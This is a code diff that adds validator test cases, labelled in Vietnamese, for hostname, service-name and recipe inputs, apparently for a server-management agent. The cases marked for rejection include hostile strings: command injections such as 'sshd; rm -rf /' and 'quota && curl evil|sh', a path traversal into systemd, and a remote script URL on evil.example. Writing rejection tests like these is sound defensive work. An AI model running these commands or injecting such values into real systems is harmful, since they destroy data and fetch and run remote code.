@@ -124,6 +124,31 @@ V = {
         ("../8.3", R, "schema", "Traversal tới socket khác"),
         ("7.4", R, "semantic", "Phiên bản không có trong gói/không được cài"),
     ]),
+    "hostname": ("Hostname", [
+        ("srv-hn-01", A, "schema", "Hợp lệ"),
+        ("srv01.itso.local", A, "schema", "FQDN hợp lệ"),
+        ("SRV01", R, "schema", "Chữ hoa"),
+        ("srv01;reboot", R, "schema", "Chèn lệnh"),
+        ("-srv01", R, "schema", "Bắt đầu bằng gạch nối"),
+        ("srv01\nevil", R, "schema", "Xuống dòng"),
+        ("", R, "schema", "Rỗng"),
+        ("srv 01", R, "schema", "Khoảng trắng"),
+    ]),
+    "service_name": ("ServiceName", [
+        ("nginx", A, "schema", "Trong allowlist"),
+        ("php8.3-fpm", A, "schema", "Trong allowlist"),
+        ("itso-agent", R, "schema", "Agent không tự điều khiển mình"),
+        ("sshd; rm -rf /", R, "schema", "Chèn lệnh"),
+        ("../../etc/systemd/system/evil", R, "schema", "Traversal"),
+        ("docker", R, "schema", "Ngoài allowlist"),
+    ]),
+    "recipe": ("Recipe", [
+        ("quota", A, "schema", "Recipe có sẵn"),
+        ("acl", A, "schema", "Recipe có sẵn"),
+        ("https://evil.example/x.sh", R, "schema", "URL tùy ý"),
+        ("quota && curl evil|sh", R, "schema", "Chèn lệnh"),
+        ("apache2", R, "schema", "Ngoài allowlist"),
+    ]),
 }
 
 
